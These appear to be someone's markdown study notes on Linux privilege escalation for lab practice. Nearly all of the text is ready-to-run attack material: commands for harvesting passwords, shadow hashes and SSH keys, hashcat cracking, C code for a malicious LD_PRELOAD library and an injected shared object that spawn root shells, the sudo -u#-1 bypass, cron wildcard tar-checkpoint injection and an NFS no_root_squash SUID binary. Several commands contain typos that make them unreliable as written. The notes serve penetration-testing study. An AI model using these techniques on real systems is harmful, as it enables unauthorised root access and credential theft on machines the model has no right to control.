- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [Checklist - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
- [Sushant 747's Guide (Country dependant - may need VPN)](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
- [Course Resource](https://github.com/TCM-Course-Resources/Linux-Privilege-Escalation-Resources)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- https://tryhackme.com/r/room/linuxprivescarena
- https://tryhackme.com/r/room/linuxprivesc

- for command injection type situation try `backticks`
## Initial Enumeration
- System Enumeration
	- `hostname`
	- `uname - a`
	- `cat /proc/version`
	- `cat /etc/issue`
	- `lscpu`
	- `ps aux`
- User Enumeration
	- `whoami`
	- `id`
	- `sudo -l`
	- `cat /etc/passwd` or `cat /etc/passwd | cut -d : -f 1`
	- `cat /etc/shadow`
	- `history` or `cat .bash_hostory`
	- `sudo su -` 
- Network Enumeration
	- `ifconfig` or `ip a`
	- `ip route`
	- `arp -a` or `ip neigh`
	- `netstat -ano`
- Password Hunting
	- `locate password | more` or `locate pass | more`-- for locating file
	- `grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null`
	- `find / -name id_rsa 2> /dev/null`

## Exploring Automated Tools
- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
- [pspy64](https://github.com/DominicBreuker/pspy)


## Escalation Path

#### Kernel Exploits
- What is kernel
![[kernel.png]]
- [Linux Kernel Exploits](https://github.com/lucyoa/kernel-exploits) resource

#### Passwords & File Permissions
- `find / 2>/dev/null | grep password` -- Files containing passwords in our directory -- try `pass=, passwd, password.bak, password.*`
- `unshadow passwd shadow` -- only if you have read write to /etc/passwd and /etc/shadow
	- Now you have hash and you can `hashcat -m 1800 cred.txt rockyou.txt`
- `find / -name authorized_keys 2> /dev/null` -- this is public key
- `find/ -name id_rsa 2> /dev/null` -- this is private key

#### Sudo
- **Escalation via Sudo Shell Escaping**
	- [GTFOBins](https://gtfobins.github.io/)
- **Escalation via LD_PRELOAD**
	- shell.c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```
	 -  gcc -fPIC -shared -o shell.so shell.c -nostartfiles 
	 - Execute any binary with the LD_PRELOAD to spawn a shell : 
		 `sudo LD_PRELOAD=<full_path_to_so_file> <program>`
		 e.g: `sudo    LD_PRELOAD=/tmp/shell.so find` 
- **CVE-2019-14287**
	- [ExploitDB](https://www.exploit-db.com/exploits/47502) --- sudo 1.8.27 - Security Bypass
	- `sudo -u#-1 /bin/bash`
- **Escalation via CVE-2019-18634**
	- [Exploit for CVE-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)

#### SUID
- `find / -perm -u=s -type f 2>/dev/null`
- **Escalation via Shared Object Injection**
	- if we found some suid such as suid-so we can
	- `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file or directory"`
	- if we have the access to such folder which suid-so is trying to access and it doesn't exist we can make a file and become root (in our case '/home/user/.config/libcalc.so')
	- libcalc.c
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
	- `gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`
	- `/usr/local/bin/suid-so`
- **Escalation via Binary Symlinks**
	- [Nginx Exploit](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
- **Escalation via Environmental Variables**
	- `env` -- to show env variables
	- `find / -type f -perm -04000 -ls 2>/dev/null`
	- Refer [linuxprivescarena](https://tryhackme.com/r/room/linuxprivescarena) - Privilege Escalation - SUID

#### Capabilities
- `getcap -r / 2>/dev/null`
- [Linux Privilege Escalation using Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
- [SUID vs Capabilities](https://mn3m.info/posts/suid-vs-capabilities/)
- [Linux Capabilities Privilege Escalation](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

####  Scheduled Tasks
- `cat /etc/crontab`
	- Let's say there is a file overwrite.sh with all * and root, we can overwrite or make one(if it does not exist)
	- `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh` 
	-  `chmod +x /home/user/overwrite.sh`
	- `/tmp/bash -p` 
- **Escalation via Cron Wildcards**
	- If we have a cron for **something.sh** and it contains the below and we have read permission
	`#!/bin/bash 
	`cd /home/user `
	`tar czf /tmp/backup.tar.gz *` -- this is the important line
	- Then we can 
		- `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh`  
		- `chmod +x runme.sh`
		- `touch /home/user/--checkpoint=1` -- doing this in /home/user because in script it is /home/user
		- `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`
		- `/tmp/bash -p`

#### NFS Root Squashing
- `cat /etc/exports`
	- there we will see `no_root_squash`-- this means we can mount that folder
	- on kali 
		- `shomount -e [box IP]` -- this will show what we can mount
		-  `mount -o rw,vers=2 [Box IP]:/mountable/path/or/folder /path/to/mount/on/kali` 
			- path/to/mount/on/kali be /test and
			- /mountable/path/or/folder be /tmp
		- `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /test/x.c`
		- `gcc /test/x.c -o /test/x`
		- `chmod +s /test/x`
	- on box
		- `/tmp/x` 
		- and you are root because everything we did because of the no_root_squash was done as root even if we execute the cmd `/tmp/x` by normal user it was executed as root
